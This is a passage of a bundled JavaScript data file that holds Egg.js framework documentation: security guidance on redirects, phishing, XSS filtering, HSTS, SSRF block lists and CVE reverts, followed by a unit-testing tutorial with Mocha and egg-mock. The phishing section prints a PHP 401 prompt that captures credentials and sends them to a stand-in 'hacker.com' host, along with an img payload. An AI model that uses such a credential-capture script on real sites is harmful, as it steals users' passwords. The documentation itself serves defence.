`,paraId:115,tocIndex:27},{value:"If user did not configure ",paraId:116,tocIndex:27},{value:"domainWhiteList",paraId:116,tocIndex:27},{value:" or ",paraId:116,tocIndex:27},{value:"domainWhiteList",paraId:116,tocIndex:27},{value:" array is empty, default will release all redirect requests, that is equal to ",paraId:116,tocIndex:27},{value:"ctx.unsafeRedirect(url)",paraId:116,tocIndex:27},{value:"If website allow users insert unverified images into the web page, that will make a risk of Phishing.",paraId:117,tocIndex:28},{value:"Like common ",paraId:118,tocIndex:28},{value:"401 Phishing",paraId:118,tocIndex:28},{value:" for example, when user accessing the page, it pops up a verification page to let user input account and password, when user input, account and password will be stored in the hacker's server.",paraId:118,tocIndex:28},{value:"Usually this kind of situation will appear in ",paraId:119,tocIndex:28},{value:"<img src=$url />",paraId:119,tocIndex:28},{value:", and not verify the ",paraId:119,tocIndex:28},{value:"$url",paraId:119,tocIndex:28},{value:" whether within the domain name white list.",paraId:119,tocIndex:28},{value:"Attacker can construct the following code in his own server:",paraId:120,tocIndex:28},{value:"401.php, used to pop up 401 window, then record user information:",paraId:121,tocIndex:28},{value:`  <?php
      header('WWW-Authenticate: Basic realm="No authorization"');
      header('HTTP/1.1 401 Unauthorized');
          $domain = "http://hacker.com/fishing/";
          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
                  header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
          }
  ?>
`,paraId:122,tocIndex:28},{value:"Then attacker generate an image url",paraId:123,tocIndex:28},{value:'<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />',paraId:123,tocIndex:28},{value:".",paraId:123,tocIndex:28},{value:"If user access the page, it will popup a window, and let user type in user's name and password, then account and password will be stored in the hacker's server.",paraId:124,tocIndex:28},{value:"Framework provides ",paraId:125,tocIndex:29},{value:".surl()",paraId:125,tocIndex:29},{value:" macro to do url filtering.It is Used to parse the url in the HTML tags in place (such as ",paraId:125,tocIndex:29},{value:'<a href ="" /><img src=""/>',paraId:125,tocIndex:29},{value:"), other places are not allowed to use.",paraId:125,tocIndex:29},{value:"You can add ",paraId:126,tocIndex:29},{value:"helper.surl($value)",paraId:126,tocIndex:29},{value:" in the template to output variable.",paraId:126,tocIndex:29},{value:"Note: in places where you need to parse the url, you must add double quotes outside of surl, or you will result in XSS vulnerabilities.",paraId:127,tocIndex:29},{value:"Do not use ",paraId:128,tocIndex:29},{value:"surl",paraId:128,tocIndex:29},{value:`<a href="$value" />
`,paraId:129,tocIndex:29},{value:"output:",paraId:130,tocIndex:29},{value:`<a href="http://ww.safe.com<script>" />
`,paraId:131,tocIndex:29},{value:"Use ",paraId:132,tocIndex:29},{value:"surl",paraId:132,tocIndex:29},{value:`<a href="helper.surl($value)" />
`,paraId:133,tocIndex:29},{value:"output:",paraId:134,tocIndex:29},{value:`<a href="http://ww.safe.com&lt;script&gt;" />
`,paraId:135,tocIndex:29},{value:"Iframe Phishing",paraId:136,tocIndex:30},{value:" By embedding iframe into the hacked page, the attacker can direct users to click on the iframe's dangerous website or even cover it, affecting the normal function of the site and hijacking the user's click operation.",paraId:136,tocIndex:30},{value:"Framework provides ",paraId:137,tocIndex:30},{value:"X-Frame-Options",paraId:137,tocIndex:30},{value:" this security header to prevent iframe Phishing. The default value is ",paraId:137,tocIndex:30},{value:"SAMEORIGIN",paraId:137,tocIndex:30},{value:", which allows only the same domain to embed this page as an iframe.",paraId:137,tocIndex:30},{value:"This configuration can be turned off when you need to embed some trusted third-party web pages.",paraId:138,tocIndex:30},{value:"HPP",paraId:8},{value:"HTTP protocol allows the parameters of the same name appears many times, due to the implementation of the application is not standard, the attacker from the distribution of parameters of transmission key and the value of different parameters, will cause to bypass the consequences of some protection.",paraId:139,tocIndex:31},{value:"The possible security threats to HPP are:",paraId:140,tocIndex:31},{value:"bypass protection and parameter checking.",paraId:141,tocIndex:31},{value:"generate logical vulnerabilities and errors that affect application code execution.",paraId:141,tocIndex:31},{value:"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)",paraId:142,tocIndex:32},{value:"http://blog.csdn.net/eatmilkboy/article/details/6761407",paraId:142,tocIndex:32},{value:"https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf",paraId:142,tocIndex:32},{value:"ebay RCE risk\uFF1A",paraId:142,tocIndex:32},{value:"http://secalert.net/2013/12/13/ebay-remote-code-execution/",paraId:142,tocIndex:32},{value:"The framework itself forces the use of the first parameter when the client transports the same key and value different parameters, so it does not lead to an HPP attack.",paraId:143,tocIndex:33},{value:"man-in-middle attack",paraId:8},{value:'HTTP is a widely used protocol for Web applications, responsible for Web content requests and acquisitions. Content request will across lots of "middleman", mainly in network link, ACTS as the content of the entrance to the browser, router, WIFI providers, communications operators. if you use a proxy, over the wall software will introduce more "middleman". Because the path and parameters of the HTTP request are explicitly written, these "middleman" can monitor, hijack, and block HTTP requests, it is called man-in-middle attack.',paraId:144,tocIndex:34},{value:"In the absence of HTTPS, ISPs can jump the link directly to an AD when the user initiates a request, or change the search results directly into their own ads. If there is a BUG in the hijacking code, the user will not be able to use the website, the white screen will appear.",paraId:145,tocIndex:34},{value:"Data leakage, request hijacking, content tampering, etc., the core reason is that HTTP is completely naked, and the domain name, path and parameters are clearly visible to the middle people. HTTPS does this by encrypting requests to make them more secure to users. In addition to protecting the interests of users, it can also avoid the traffic being held hostage to protect its own interests.",paraId:146,tocIndex:34},{value:"Although HTTPS is not absolute security, the organization that holds the root certificate and the organization that controls the encryption algorithm can also conduct a man-in-middle attack. But HTTPS is the most secure solution under the current architecture, and it significantly increases the cost of man-in-middle attack.",paraId:147,tocIndex:34},{value:"So, if you use the Egg framework to develop web site developers, please be sure to update your website to HTTPS.",paraId:148,tocIndex:34},{value:"For HTTPS, one should pay attention to is the HTTP transport security (HSTS) strictly, if you don't use HSTS, when a user input url in the browser without HTTPS, the browser will use HTTP access by default.",paraId:149,tocIndex:34},{value:"Framework has disableb ",paraId:150,tocIndex:34},{value:"HSTS Strict-Transport-security",paraId:150,tocIndex:34},{value:" by default, then make the HTTPS site not redirect to HTTP. If your site supports HTTPS, be sure to open it.If our Web site is an HTTP site, we need to close this header.",paraId:150,tocIndex:34},{value:"The configuration is as follows:",paraId:151,tocIndex:34},{value:"maxAge one yeah for default ",paraId:152,tocIndex:34},{value:"365 * 24 * 3600",paraId:152,tocIndex:34},{value:"\u3002",paraId:152,tocIndex:34},{value:"includeSubdomains default is false, you can add subdomain to confirm all subdomains could be accessed by HTTPS.",paraId:152,tocIndex:34},{value:"In a ",paraId:153,tocIndex:35},{value:"Server-Side Request Forgery (SSRF)",paraId:153,tocIndex:35},{value:" attack, the attacker can abuse functionality on the server to read or update internal resources.",paraId:153,tocIndex:35},{value:"Generally, SSRF are common in that developers directly request the URL resources passed in by the client on the server side. Once an attacker passes in some internal URLs, an SSRF attack can be initiated.",paraId:154,tocIndex:35},{value:"Usually, we will prevent SSRF attacks based on the IP blacklist of intranets. By filtering the IP addresses obtained after resolving domain names, we prohibit access to internal IP addresses to prevent SSRF attacks.",paraId:155,tocIndex:36},{value:"The framework provides the ",paraId:156,tocIndex:36},{value:"safeCurl",paraId:156,tocIndex:36},{value:" method on ",paraId:156,tocIndex:36},{value:"ctx",paraId:156,tocIndex:36},{value:", \u02BBapp",paraId:156,tocIndex:36},{value:"and",paraId:156,tocIndex:36},{value:"agent",paraId:156,tocIndex:36},{value:", which will filter the specified intranet IP address while doing the network request. In additon of the method are the same as ",paraId:156,tocIndex:36},{value:"curl`.",paraId:156,tocIndex:36},{value:"ctx.safeCurl(url, options)",paraId:157,tocIndex:36},{value:"app.safeCurl(url, options)",paraId:157,tocIndex:36},{value:"agent.safeCurl(url, options)",paraId:157,tocIndex:36},{value:"Calling the ",paraId:158,tocIndex:37},{value:"safeCurl",paraId:158,tocIndex:37},{value:" method directly does not have any effect. It also needs to work with security configurations.",paraId:158,tocIndex:37},{value:"ipBlackList",paraId:159,tocIndex:37},{value:"(Array) - \bConfigure the intranet IP address list. IP addresses on these network segments cannot be accessed.",paraId:159,tocIndex:37},{value:"checkAddress",paraId:159,tocIndex:37},{value:"(Function) - Directly configure a function to check the IP address, and determine whether it is allowed to be accessed in ",paraId:159,tocIndex:37},{value:"safeCurl",paraId:159,tocIndex:37},{value:" according to the return value of the function. When returning is not ",paraId:159,tocIndex:37},{value:"true",paraId:159,tocIndex:37},{value:", this IP cannot be accessed. ",paraId:159,tocIndex:37},{value:"checkAddress",paraId:159,tocIndex:37},{value:" has a higher priority than ",paraId:159,tocIndex:37},{value:"ipBlackList",paraId:159,tocIndex:37},{value:".",paraId:159,tocIndex:37},{value:`// config/config.default.js
exports.security = {
  ssrf: {
    ipBlackList: [
      '10.0.0.0/8', // support CIDR subnet
      '0.0.0.0/32',
      '127.0.0.1', // support specific IP address
    ],
    // ipBlackList does not take effect when checkAddress is configured
    checkAddress(ip) {
      return ip !== '127.0.0.1';
    },
  },
};
`,paraId:160,tocIndex:37},{value:"To judge whether a domain is a secure domain. It is configured in the security configuration, see ",paraId:161,tocIndex:39},{value:"ctx.redirect",paraId:161,tocIndex:39},{value:" parts.",paraId:161,tocIndex:39},{value:"This function provides template preprocessing - the ability to automatically insert CSRF key, which can be automatically inserted CSRF hidden input into all of the form tags, then user will not need to manually write it.",paraId:162,tocIndex:40},{value:"This function provides the template pretreatment - automatically inserted into the ",paraId:163,tocIndex:41},{value:"nonce",paraId:163,tocIndex:41},{value:" ability, if the site opens ",paraId:163,tocIndex:41},{value:"CSP",paraId:163,tocIndex:41},{value:" safety http header, and want to use ",paraId:163,tocIndex:41},{value:"CSP 2.0 nonce",paraId:163,tocIndex:41},{value:" features, you can use this function. Reference ",paraId:163,tocIndex:41},{value:"CSP",paraId:163,tocIndex:41},{value:".",paraId:163,tocIndex:41},{value:"This function scans the script tag in the template and automatically adds ",paraId:164,tocIndex:41},{value:"nonce",paraId:164,tocIndex:41},{value:".",paraId:164,tocIndex:41},{value:"For sites that do not open HTTPS, this function can be limited to preventing ISP hijacking.",paraId:165,tocIndex:42},{value:"In the security fixes of node.js, there may be breaking changes. For example, in version 18.9.1, a security vulnerability was fixed, which caused some encryption-related code to not function properly. To address this issue, we provide a revert parameter, which is converted to the --security-revert parameter at startup, allowing the bypassing of the CVE fix.",paraId:166,tocIndex:43},{value:`// package.json
{
  "egg": {
    // Supports two configuration methods
    // One is to use a string directly, specifying a CVE
    "revert": "CVE-2023-46809",
    // The other is to use an array of strings, allowing the specification of multiple CVEs
    "revert": [ "CVE-2023-46809" ]
  }
}
`,paraId:167,tocIndex:43}]},58204:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(90349);const t=[{value:"Let us start with a few questions:",paraId:0,tocIndex:0},{value:"How to measure the quality of code",paraId:1,tocIndex:0},{value:"How to ensure the quality of code",paraId:1,tocIndex:0},{value:"Are you free to refactor code",paraId:1,tocIndex:0},{value:"How to guarantee the correctness of refactored code",paraId:1,tocIndex:0},{value:"Have you confidence to release your untested code",paraId:1,tocIndex:0},{value:"If you are not sure, you probably need unit testing.",paraId:2,tocIndex:0},{value:"Actually, it brings us tremendous benefits:",paraId:3,tocIndex:0},{value:"guarantee the quality of maintaining code",paraId:4,tocIndex:0},{value:"guarantee the correctness of reconstruction",paraId:4,tocIndex:0},{value:"enhance confidence",paraId:4,tocIndex:0},{value:"automation",paraId:4,tocIndex:0},{value:"It's more important to use unit tests in a web application during the fast iteration, because each testing case can contribute to the increasing stability of the application. The result of various inputs in each test is definite, so it's obvious to detect whether the changed code has an impact on correctness or not.",paraId:5,tocIndex:0},{value:"Therefore, code, such as in Controller, Service, Helper, Extend and so on, require corresponding unit testing for quality assurances, especially modification of the framework or plugins, of which test coverage is strongly recommended to be 100%.",paraId:6,tocIndex:0},{value:"When ",paraId:7,tocIndex:1},{value:"searching 'test framework' in npm",paraId:7,tocIndex:1},{value:", there are a mass of test frameworks owning their own unique characteristics.",paraId:7,tocIndex:1},{value:"We choose and recommend you to use ",paraId:8,tocIndex:2},{value:"Mocha",paraId:8,tocIndex:2},{value:", which is very rich in functionality and supports running in Node.js and Browser, what's more, it's very friendly to asynchronous test support.",paraId:8,tocIndex:2},{value:"Mocha is a feature-rich JavaScript test framework running on Node.js and in the browser, making asynchronous testing simple and fun. Mocha tests run serially, allowing for flexible and accurate reporting, while mapping uncaught exceptions to the correct test cases.",paraId:9,tocIndex:2},{value:"Why not another recently popular framework ",paraId:10,tocIndex:3},{value:"AVA",paraId:10,tocIndex:3},{value:" which looks like faster? AVA is great, but practice of several projects tells us the truth that code is harder to write.",paraId:10,tocIndex:3},{value:"Comments from ",paraId:11,tocIndex:3},{value:"@dead-horse",paraId:11,tocIndex:3},{value:":",paraId:11,tocIndex:3},{value:"AVA is not stable enough, for example, CPU capacity is going to be overloaded when plenty of files are running concurrently. The solution of setting parameter to control concurrent could work, but 'only mode' would be not functioning any more.",paraId:12,tocIndex:3},{value:"Running cases concurrently makes great demands on implementation, because each test has to be independent, especially containing mock.",paraId:12,tocIndex:3},{value:"Considering the expensive initialization of app, it's irrational of AVA to execute each file in an independent process initializing their own app while serial framework does only one time.",paraId:12,tocIndex:3},{value:"Comments from ",paraId:13,tocIndex:3},{value:"@fool2fish",paraId:13,tocIndex:3},{value:"\uFF1A",paraId:13,tocIndex:3},{value:"It's faster to use AVA in simple application(maybe too simple to judge). But it's not recommended to use in complicate one because of its considerable flaws, such as incapability of offering accurate error stacks; meanwhile, concurrency may cause service relying on other test settings to hang up which reduces the success rate of the test. Therefore, process testing, for example, CRUD operations of database, should not use AVA.",paraId:14,tocIndex:3},{value:"Assertion libraries",paraId:15,tocIndex:4},{value:", as flourishing as test frameworks, are emerged continuously. The one we used has changed from ",paraId:15,tocIndex:4},{value:"assert",paraId:15,tocIndex:4},{value:" to ",paraId:15,tocIndex:4},{value:"should",paraId:15,tocIndex:4},{value:", and then to ",paraId:15,tocIndex:4},{value:"expect",paraId:15,tocIndex:4},{value:`
, but we are still trying to find better one.`,paraId:15,tocIndex:4},{value:"In the end, we go back to the original assertion library because of the appearance of ",paraId:16,tocIndex:4},{value:"power-assert",paraId:16,tocIndex:4},{value:", which best expresses ",paraId:16,tocIndex:4},{value:"\u300ENo API is the best API\u300F",paraId:16,tocIndex:4},{value:".",paraId:16,tocIndex:4},{value:"To be Short, Here are it's advantages:",paraId:17,tocIndex:4},{value:"No API is the best API. Assert is all.",paraId:18,tocIndex:4},{value:"** powerful failure message **",paraId:18,tocIndex:4},{value:"** powerful failure message **",paraId:18,tocIndex:4},{value:"** powerful failure message **",paraId:18,tocIndex:4},{value:`You may intentionally make mistakes in order to see these failure messages.
`,paraId:19,tocIndex:4},{value:`Framework defines some fundamental rules on unit testing to keep us focus on coding rather than assistant work, such as how to execute test cases.
Egg does some basic conventions for unit testing.`,paraId:20,tocIndex:5},{value:"Test code is demand to be put in ",paraId:21,tocIndex:6},{value:"test",paraId:21,tocIndex:6},{value:" directory, include ",paraId:21,tocIndex:6},{value:"fixtures",paraId:21,tocIndex:6},{value:" and assistant scripts.",paraId:21,tocIndex:6},{value:"Each Test file has to be named by the pattern of ",paraId:22,tocIndex:6},{value:"${filename}.test.js",paraId:22,tocIndex:6},{value:", ending with ",paraId:22,tocIndex:6},{value:".test.js",paraId:22,tocIndex:6},{value:".",paraId:22,tocIndex:6},{value:"For example:",paraId:23,tocIndex:6},{value:`test
\u251C\u2500\u2500 controller
\u2502\xA0\xA0 \u2514\u2500\u2500 home.test.js
\u251C\u2500\u2500 hello.test.js
\u2514\u2500\u2500 service
    \u2514\u2500\u2500 user.test.js
`,paraId:24,tocIndex:6},{value:"Consistently using ",paraId:25,tocIndex:7},{value:"egg-bin to launch tests",paraId:26,tocIndex:7},{value:" , which automatically loads modules like ",paraId:25,tocIndex:7},{value:"Mocha",paraId:25,tocIndex:7},{value:", ",paraId:25,tocIndex:7},{value:"co-mocha",paraId:25,tocIndex:7},{value:", ",paraId:25,tocIndex:7},{value:"power-assert",paraId:25,tocIndex:7},{value:", ",paraId:25,tocIndex:7},{value:"nyc",paraId:25,tocIndex:7},{value:" into test scripts, so that we can ",paraId:25,tocIndex:7},{value:"concentrate on writing tests",paraId:25,tocIndex:7},{value:" without wasting time on the choice of various test tools or modules.",paraId:25,tocIndex:7},{value:"The only thing you need to do is setting ",paraId:27,tocIndex:7},{value:"scripts.test",paraId:27,tocIndex:7},{value:" in ",paraId:27,tocIndex:7},{value:"package.json",paraId:27,tocIndex:7},{value:".",paraId:27,tocIndex:7},{value:`{
  "scripts": {
    "test": "egg-bin test"
  }
}
`,paraId:28,tocIndex:7},{value:"Then tests would be launched by executing ",paraId:29,tocIndex:7},{value:"npm test",paraId:29,tocIndex:7},{value:" command.",paraId:29,tocIndex:7},{value:`npm test

> unittest-example@ test /Users/mk2/git/github.com/eggjs/examples/unittest
> egg-bin test

  test/hello.test.js
    \u2713 should work

  1 passing (10ms)
`,paraId:30,tocIndex:7},{value:"This chapter introduces you how to write test, and introduction of tests for the framework and plugins are located in ",paraId:31,tocIndex:8},{value:"framework",paraId:32,tocIndex:8},{value:" and ",paraId:31,tocIndex:8},{value:"plugin",paraId:33,tocIndex:8},{value:".",paraId:31,tocIndex:8},{value:"Generally, a complete application test requires initialization and cleanup, such as deleting temporary files or destroy application. Also, we have to deal with exceptional situations like network problem and exception visit of server.",paraId:34,tocIndex:9},{value:"We extracted an ",paraId:35,tocIndex:9},{value:"egg-mock",paraId:35,tocIndex:9},{value:"module for mock, help for quick implementation of application unit tests, supporting fast creation of ctx to test.",paraId:35,tocIndex:9},{value:"Before launching, we have to create an instance of App to test code of application-level like Controller, Middleware or Service.",paraId:36,tocIndex:10},{value:"We can easily create an app instance with Mocha's ",paraId:37,tocIndex:10},{value:"before",paraId:37,tocIndex:10},{value:" hook through egg-mock.",paraId:37,tocIndex:10},{value:`// test/controller/home.test.js
const assert = require('assert');
const mock = require('@eggjs/mock');

describe('test/controller/home.test.js', () => {
  let app;
  before(() => {
    // create a current app instance
    app = mock.app();
    // execute tests after app is ready
    return app.ready();
  });
});
`,paraId:38,tocIndex:10},{value:"Now, we have an app instance, and it's the base of all the following tests. See more about app at ",paraId:39,tocIndex:10},{value:"mock.app(options)",paraId:39,tocIndex:10},{value:".",paraId:39,tocIndex:10},{value:"It's redundancy to create an instance in each test file, so we offered an bootstrap file in egg-mock to create it conveniently.",paraId:40,tocIndex:10},{value:`// test/controller/home.test.js
const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/controller/home.test.js', () => {
  // test cases
});
`,paraId:41,tocIndex:10},{value:"Except app, tests for Extend, Service and Helper are also taken into consideration. Let's create a context through ",paraId:42,tocIndex:11},{value:"app.mockContext(options)",paraId:42,tocIndex:11},{value:" offered by egg-mock.",paraId:42,tocIndex:11},{value:`it('should get a ctx', () => {
  const ctx = app.mockContext();
  assert(ctx.method === 'GET');
  assert(ctx.url === '/');
});
`,paraId:43,tocIndex:11},{value:"If we want to mock the data for ",paraId:44,tocIndex:11},{value:"ctx.user",paraId:44,tocIndex:11},{value:", we can do that by passing the data parameter to mockContext:",paraId:44,tocIndex:11},{value:`it('should mock ctx.user', () => {
  const ctx = app.mockContext({
    user: {
      name: 'fengmk2',
    },
  });
  assert(ctx.user);
  assert(ctx.user.name === 'fengmk2');
});
`,paraId:45,tocIndex:11},{value:"Since we have got the app and the context, you are free to do a lot of tests.",paraId:46,tocIndex:11},{value:"Pay close attention to testing order, and make sure any chunk of code is executed as you expected.",paraId:47,tocIndex:12},{value:"Common Error:",paraId:48,tocIndex:12},{value:`// Bad
const { app } = require('egg-mock/bootstrap');

describe('bad test', () => {
  doSomethingBefore();

  it('should redirect', () => {
    return app.httpRequest().get('/').expect(302);
  });
});
`,paraId:49,tocIndex:12},{value:"Mocha is going to load all the code in the beginning, which means ",paraId:50,tocIndex:12},{value:"doSomethingBefore",paraId:50,tocIndex:12},{value:" would be invoked before execution. It's not expected when especially using 'only' to specify the test.",paraId:50,tocIndex:12},{value:"It's supposed to locate in a ",paraId:51,tocIndex:12},{value:"before",paraId:51,tocIndex:12},{value:" hook in the suite of a particular test case.",paraId:51,tocIndex:12},{value:`// Good
const { app } = require('egg-mock/bootstrap');

describe('good test', () => {
  before(() => doSomethingBefore());

  it('should redirect', () => {
    return app.httpRequest().get('/').expect(302);
  });
});
`,paraId:52,tocIndex:12},{value:"Mocha have keywords - before, after, beforeEach and afterEach - to set up preconditions and clean-up after your tests. These keywords could be multiple and execute in strict order.",paraId:53,tocIndex:12},{value:`describe('egg test', () => {
  before(() => console.log('order 1'));
  before(() => console.log('order 2'));
  after(() => console.log('order 6'));
  beforeEach(() => console.log('order 3'));
  afterEach(() => console.log('order 5'));
  it('should worker', () => console.log('order 4'));
});
`,paraId:54,tocIndex:12},{value:"egg-bin supports asynchronous test:",paraId:55,tocIndex:13},{value:`// using Promise
it('should redirect', () => {
  return app.httpRequest().get('/').expect(302);
});

// using callback
it('should redirect', (done) => {
  app.httpRequest().get('/').expect(302, done);
});

// using async
it('should redirect', async () => {
  await app.httpRequest().get('/').expect(302);
});
`,paraId:56,tocIndex:13},{value:"According to specific situation, you could make different choice of these ways. Multiple asynchronous test cases could be composed to one test with async function, or divided into several independent tests.",paraId:57,tocIndex:13},{value:"It's the tough part of all application tests, since it's closely related to router configuration. We need use ",paraId:58,tocIndex:14},{value:"app.httpRequest()",paraId:58,tocIndex:14},{value:" to return a real instance ",paraId:58,tocIndex:14},{value:"SuperTest",paraId:58,tocIndex:14},{value:", which connects Router and Controller and could also help us to examine param verification of Router by loading boundary conditions. ",paraId:58,tocIndex:14},{value:"app.httpRequest()",paraId:58,tocIndex:14},{value:" is a request instance ",paraId:58,tocIndex:14},{value:"SuperTest",paraId:58,tocIndex:14},{value:" which is encapsulated by ",paraId:58,tocIndex:14},{value:"egg-mock",paraId:58,tocIndex:14},{value:".",paraId:58,tocIndex:14},{value:"Here is an ",paraId:59,tocIndex:14},{value:"app/controller/home.js",paraId:59,tocIndex:14},{value:" example.",paraId:59,tocIndex:14},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('homepage', '/', controller.home.index);
};

// app/controller/home.js
class HomeController extends Controller {
  async index() {
    this.ctx.body = 'hello world';
  }
}
`,paraId:60,tocIndex:14},{value:"Then a test.",paraId:61,tocIndex:14},{value:`// test/controller/home.test.js
const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/controller/home.test.js', () => {
  describe('GET /', () => {
    it('should status 200 and get the body', () => {
      // load \`GET /\` request
      return app.httpRequest()
        .get('/')
        .expect(200) // set expectation of status to 200
        .expect('hello world'); // set expectation of body to 'hello world'
    });

    it('should send multi requests', async () => {
      await app.httpRequest()
        .get('/')
        .expect(200) v
        .expect('hello world'); // set expectation of body to 'hello world'

      // once more
      const result = await app.httpRequest()
        .get('/')
        .expect(200)
        .expect('hello world');

      // verify via assert
      assert(result.status === 200);
    });
  });
});
`,paraId:62,tocIndex:14},{value:"app.httpRequest",paraId:63,tocIndex:14},{value:" based on SuperTest supports a majority of HTTP methods such as GET, POST, PUT, and it provides rich interfaces to construct request, such as a JSON POST request.",paraId:63,tocIndex:14},{value:`// app/controller/home.js
class HomeController extends Controller {
  async post() {
    this.ctx.body = this.ctx.request.body;
  }
}

// test/controller/home.test.js
it('should status 200 and get the request body', () => {
  // mock CSRF token\uFF0Cexplain later
  app.mockCsrf();
  return app
    .httpRequest()
    .post('/post')
    .type('form')
    .send({
      foo: 'bar',
    })
    .expect(200)
    .expect({
      foo: 'bar',
    });
});
`,paraId:64,tocIndex:14},{value:"See details at ",paraId:65,tocIndex:14},{value:"SuperTest Document",paraId:65,tocIndex:14},{value:"\u3002",paraId:65,tocIndex:14},{value:"The security plugin of framework would enable ",paraId:66,tocIndex:15},{value:"CSRF prevention",paraId:67,tocIndex:15},{value:" as default. Typically, tests have to precede with a request of page in order to parse CSRF token from the response, and then use the token in later POST requests. But egg-mock provides the ",paraId:66,tocIndex:15},{value:"app.mockCsrf()",paraId:66,tocIndex:15},{value:" function to skip the verification of the CSRF token of requests sent by SuperTest.",paraId:66,tocIndex:15},{value:`app.mockCsrf();
return app
  .httpRequest()
  .post('/post')
  .type('form')
  .send({
    foo: 'bar',
  })
  .expect(200)
  .expect({
    foo: 'bar',
  });
`,paraId:68,tocIndex:15},{value:"Service is easier to test than Controller. We need to create a ctx, and then get the instance of Service via ",paraId:69,tocIndex:16},{value:"ctx.service.${serviceName}",paraId:69,tocIndex:16},{value:", and then use the instance to test.",paraId:69,tocIndex:16},{value:"For example:",paraId:70,tocIndex:16},{value:`// app/service/user.js
class UserService extends Service {
  async get(name) {
    return await userDatabase.get(name);
  }
}
`,paraId:71,tocIndex:16},{value:"And a test:",paraId:72,tocIndex:16},{value:`describe('get()', () => {
  // using generator function because of asynchronous invoking
  it('should get exists user', async () => {
    // create ctx
    const ctx = app.mockContext();
    // get service.user via ctx
    const user = await ctx.service.user.get('fengmk2');
    assert(user);
    assert(user.name === 'fengmk2');
  });

  it('should get null when user not exists', async () => {
    const ctx = app.mockContext();
    const user = await ctx.service.user.get('fengmk1');
    assert(!user);
  });
});
`,paraId:73,tocIndex:16},{value:"Of course it's just a sample, actual code would probably be more complicated.",paraId:74,tocIndex:16},{value:"It's extendable of Application, Request, Response and Context as well as Helper, and we are able to write specific test cases for extended functions or properties.",paraId:75,tocIndex:17},{value:"When an app instance is created by egg-mock, the extended functions and properties are already available on the instance and can be tested directly.",paraId:76,tocIndex:18},{value:"For example, we extend the application in ",paraId:77,tocIndex:18},{value:"app/extend/application",paraId:77,tocIndex:18},{value:" to support cache based on ",paraId:77,tocIndex:18},{value:"ylru",paraId:77,tocIndex:18},{value:".",paraId:77,tocIndex:18},{value:`const LRU = Symbol('Application#lru');
const LRUCache = require('ylru');
module.exports = {
  get lru() {
    if (!this[LRU]) {
      this[LRU] = new LRUCache(1000);
    }
    return this[LRU];
  },
};
`,paraId:78,tocIndex:18},{value:"A corresponding test:",paraId:79,tocIndex:18},{value:`describe('get lru', () => {
  it('should get a lru and it work', () => {
    // set cache
    app.lru.set('foo', 'bar');
    // get cache
    assert(app.lru.get('foo') === 'bar');
  });
});
`,paraId:80,tocIndex:18},{value:"As you can see, it's easy.",paraId:81,tocIndex:18},{value:"Compared to Application, you need only one more step for Context tests, which is to create an Context instance via ",paraId:82,tocIndex:19},{value:"app.mockContext",paraId:82,tocIndex:19},{value:".",paraId:82,tocIndex:19},{value:"Such as adding a property named ",paraId:83,tocIndex:19},{value:"isXHR",paraId:83,tocIndex:19},{value:" to ",paraId:83,tocIndex:19},{value:"app/extend/context.js",paraId:83,tocIndex:19},{value:" to present whether or not the request was submitted via ",paraId:83,tocIndex:19},{value:"XMLHttpRequest",paraId:83,tocIndex:19},{value:".",paraId:83,tocIndex:19},{value:`module.exports = {
  get isXHR() {
    return this.get('X-Requested-With') === 'XMLHttpRequest';
  },
};
`,paraId:84,tocIndex:19},{value:"A corresponding test:",paraId:85,tocIndex:19},{value:`describe('isXHR()', () => {
  it('should true', () => {
    const ctx = app.mockContext({
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
      },
    });
    assert(ctx.isXHR === true);
  });

  it('should false', () => {
    const ctx = app.mockContext({
      headers: {
        'X-Requested-With': 'SuperAgent',
      },
    });
    assert(ctx.isXHR === false);
  });
});
`,paraId:86,tocIndex:19},{value:"Extended properties and function are available on ",paraId:87,tocIndex:20},{value:"ctx.request",paraId:87,tocIndex:20},{value:", so they can be tested directly.",paraId:87,tocIndex:20},{value:"For example, provide a ",paraId:88,tocIndex:20},{value:"isChrome",paraId:88,tocIndex:20},{value:" property to ",paraId:88,tocIndex:20},{value:"app/extend/request.js",paraId:88,tocIndex:20},{value:" to verify requests whether they are from Chrome or not.",paraId:88,tocIndex:20},{value:`const IS_CHROME = Symbol('Request#isChrome');
module.exports = {
  get isChrome() {
    if (!this[IS_CHROME]) {
      const ua = this.get('User-Agent').toLowerCase();
      this[IS_CHROME] = ua.includes('chrome/');
    }
    return this[IS_CHROME];
  },
};
`,paraId:89,tocIndex:20},{value:"A corresponding test:",paraId:90,tocIndex:20},{value:`describe('isChrome()', () => {
  it('should true', () => {
    const ctx = app.mockContext({
      headers: {
        'User-Agent': 'Chrome/56.0.2924.51',
      },
    });
    assert(ctx.request.isChrome === true);
  });

  it('should false', () => {
    const ctx = app.mockContext({
      headers: {
        'User-Agent': 'FireFox/1',
      },
    });
    assert(ctx.request.isChrome === false);
  });
});
`,paraId:91,tocIndex:20},{value:"Identical with Request, Response test could be based on ",paraId:92,tocIndex:21},{value:"ctx.response",paraId:92,tocIndex:21},{value:" directly, accessing all the extended functions and properties.",paraId:92,tocIndex:21},{value:"For example, provide an ",paraId:93,tocIndex:21},{value:"isSuccess",paraId:93,tocIndex:21},{value:" property to indicate current status code equal to 200 or not.",paraId:93,tocIndex:21},{value:`module.exports = {
  get isSuccess() {
    return this.status === 200;
  },
};
`,paraId:94,tocIndex:21},{value:"The corresponding test:",paraId:95,tocIndex:21},{value:`describe('isSuccess()', () => {
  it('should true', () => {
    const ctx = app.mockContext();
    ctx.status = 200;
    assert(ctx.response.isSuccess === true);
  });

  it('should false', () => {
    const ctx = app.mockContext();
    ctx.status = 404;
    assert(ctx.response.isSuccess === false);
  });
});
`,paraId:96,tocIndex:21},{value:"Similar to Service, Helper is available on ctx, which can be tested directly.",paraId:97,tocIndex:22},{value:"Such as ",paraId:98,tocIndex:22},{value:"app/extend/helper.js",paraId:98,tocIndex:22},{value:":",paraId:98,tocIndex:22},{value:`module.exports = {
  money(val) {
